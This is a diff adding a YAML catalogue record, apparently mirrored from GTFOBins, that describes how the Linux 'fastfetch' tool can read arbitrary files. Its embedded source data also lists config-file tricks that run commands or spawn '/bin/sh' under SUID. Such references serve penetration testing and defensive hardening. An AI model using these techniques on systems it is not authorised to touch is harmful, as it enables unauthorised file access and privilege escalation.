@@ -1,0 +1,93 @@
+id: gtfobins/fastfetch/file-read/unprivileged
+type: binary
+platform: linux
+name: fastfetch
+phases:
+- collection
+capabilities:
+- file-read
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: fastfetch --file /path/to/input-file
+  comment: The file content is used as the logo while some other information is displayed on its right.
+references:
+- https://gtfobins.github.io/gtfobins/fastfetch/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        fastfetch:
+          functions:
+            command:
+            - code: 'echo ''{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}''
+                >/path/to/temp-file.jsonc
+
+                fastfetch -c /path/to/temp-file.jsonc'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            file-read:
+            - binary: false
+              code: fastfetch --file /path/to/input-file
+              comment: The file content is used as the logo while some other information is displayed
+                on its right.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: 'echo ''{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}''
+                >/path/to/temp-file.jsonc
+
+                fastfetch -c /path/to/temp-file.jsonc'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/fastfetch/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:341f890204ab69db8e4459944fb4b119f1a06f7924126da953556d93d76f54a8
